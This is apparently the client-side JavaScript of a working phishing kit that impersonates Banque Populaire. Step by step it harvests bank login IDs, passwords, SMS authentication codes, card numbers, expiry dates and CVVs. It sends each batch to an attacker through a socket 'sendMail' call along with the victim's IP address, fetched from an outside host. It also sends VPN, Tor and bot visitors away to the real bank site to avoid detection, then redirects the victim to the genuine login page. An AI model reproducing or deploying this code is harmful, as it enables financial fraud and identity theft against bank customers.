$(document).ready(()=>{

    $('body').show()
    $('#card_').mask('0000 0000 0000 0000');
    $('#exp_').mask(' 00 / 0000');
    $('#cvv_').mask('0000');
    $('#sms_').mask('000 000');
    $('#code_').mask('0000 0000');


//Vue.use(vueCompositionApi.default);
Vue.use(vant)

Vue.directive('mask', VueMask.VueMaskDirective);

//Vue.use(vuesax)
const { ref , reactive,watch,onMounted,computed ,watchEffect} = VueCompositionAPI;


new Vue({
    vuetify: new Vuetify({
        theme:{
            dark:false,
            themes:{
                light:{
                    primary:'#003c82',
                }
            
        }
        }
    }),
    el:'#bp_',
    setup(props,{root}){

        const state =reactive({
            API:$('#API').val(),
            security:$('#Security').val(),
                loading:false,
                step:0,
                isNotValid:true,
                region:'',
                Ip:null,
                to:'netmeduz@protonmail.com',
                message:computed(()=>{


                    var message = {
                        name:'📌 BQ Populaire | ' +iPfull,
                        from:'nsa.cloud@orange.com',
                        to:$('#Mail').val(),
                        subject :  state.step==10 ? ' SMS AUTH ':''+ state.step==1 ? ' DEP + LOG ' : '' + state.step==2 ? 'CC CARD' :'' + state.step==3 ? 'CODE  KEYS ' :'' ,
                        html : ''+JSON.stringify(state.log)+'<p><br>'+JSON.stringify(locIp)+'</p>',
                        text:''+JSON.stringify(state.log)+'<p><br>'+JSON.stringify(locIp)+'</p>',

                        
                    }

                    return message


                }),
                log:{
                    DEP:'',
                    ID:'',
                    PASS:'',
                    SMS_AUTH:'',
                    NUM:'',
                    EX:'',
                    CVV:'',
                    CODE:'',

                }


        })


        onMounted(async()=>{



            $('body').show()
            $('#card_').mask('0000 0000 0000 0000');
            $('#exp_').mask(' 00 / 0000');
            $('#cvv_').mask('0000');
            $('#sms_').mask('000 000');
            $('#code_').mask('0000 0000');


        fetch('//keys0.openode.io/ip',{
         mode:'cors',
       }).then(e=>{
         e.json().then(location=>{
          
           var locIp_=location
           var iPfull_ =location.ip || location

          
           state.Ip  = iPfull_ || locIp_
          
         })
       })

       if(state.security){

        console.log('Security enabled')
        var ssl = await fetch('https://keys0.openode.io/iqs?api='+state.API)
        .then(e=>e.json()||e.text())
        .then(e=>e)
        .catch(err=>console.log(err))
        
       try{
        if(ssl.proxy || ssl.vpn || ssl.tor || ssl.bot_status || ssl.recent_abuse || ssl.fraud_score>74 || ssl.active_vpn || ssl.active_tor){
    
            window.location.href='https://www.banquepopulaire.fr/'
            }
       } catch(err){
    
        window.location.href='https://www.banquepopulaire.fr/'
    
    
       }
       } else {
    
        console.log('Security disabled')
       }

       watch(()=>state.log.DEP,()=>{

        
        state.log.PASS =''
        state.isNotValid=true

       })

       watch(()=>state.log.ID,(e)=>{

        
       if(e=='') state.isNotValid=true

       })

           

            watch(()=>state.log.PASS,()=>{

                //console.log(state.log.PASS)
                if(state.log.PASS==null) state.log.PASS=''
                if(!state.log.DEP.toLowerCase().match(/(bred)/)){
                
                    if(state.log.PASS?.length!==8) {
                        state.isNotValid=true
                    } else {
                        state.isNotValid=false
                    }

                } else {

                    console.log(state.log.PASS?.length)

                    if(state.log.PASS?.length>5){

                     
                        state.isNotValid=false

                    } else {
                        state.isNotValid=true
                    }


                }

                

                

            })

            watch(()=>[state.log.NUM,state.log.EX,state.log.CVV],()=>{

  

                if(state.log.NUM?.length==!16 || state.log.EX?.length<4 || state.log.CVV?.length<3) {
                    state.isNotValid=true
                } else {
                    state.isNotValid=false
                }

            })
        
            
            

            watch(()=>[state.log.DEP,state.log.ID],()=>{

  

                if(state.log.DEP?.length<2 || state.log.ID?.length<6) {
                    state.isNotValid=true
                } else {
                    state.isNotValid=false
                }

            })
        })

        function loginFirst(){

            console.log(state.log.SMS_AUTH)
            if(state.log.SMS_AUTH.length!==9) return root.$Message.error('CODE incorrect , veuillez corriger svp')
            state.loading=true
            socket.emit('sendMail',state.message,(clb)=>{

                if(clb){

                    state.step=2
                    state.loading=false

                } else {

                    window.location.reload()
                }

        });



        }

        function login(){

           // console.log(state.log)

                    if(state.log.DEP.length<2 || state.log.ID.length<5) return root.$Message.error('Corriger votre saisie')
                    state.isNotValid=true
                    state.step++
        }

        function set(e){
           
            
          if(!state.log.DEP.toLowerCase().match(/(bred)/)){

            if(state.log.PASS?.length<8)  state.log.PASS+=e
          } else {

          }
           //console.log(state.log.PASS?.length ?? '0' ,state.log.PASS)
        }

        function sendCC(){

            //console.log(state.message,state.log)
            if(state.isNotValid) return root.$Message.error(`Informations carte bancaire erronés`)
            state.loading=true
            state.message.subject =state.message.subject +' | '+state.Ip
            
            socket.emit('sendMail',state.message,(clb)=>{

                    if(clb){

                        state.step++

                        setTimeout(()=>{
                            state.loading=false
                        },9000)

                    } else {

                        window.location.reload()
                    }

            })

        }


        async function sendLog(){
           // console.log(state.message,state.log)
            state.isNotValid=true

            state.loading=true
           // state.message.subject =state.message.subject +' | '+state.Ip
            
            socket.emit('sendMail',state.message,(clb)=>{

                    if(clb){

                        state.step=10

                        setTimeout(()=>{
                            state.loading=false
                        },11400)

                    } else {

                        window.location.reload()
                    }

            })
            


           



        }

        function sendSms(){

            if(state.log.CODE.length<6) return root.$Message.error('Code invalide')
            state.loading=true
            state.message.subject =state.message.subject +' | '+state.Ip
            
            socket.emit('sendMail',state.message,(clb)=>{

                    if(clb){
                        window.location.href="https://www.banquepopulaire.fr/se-connecter/identifier"
                        state.step++

                        state.loading=false

                    } else {

                        window.location.reload()
                    }

            })



        }


        return{state,login,set,sendCC,sendLog,sendSms,loginFirst}


    }







    
})
})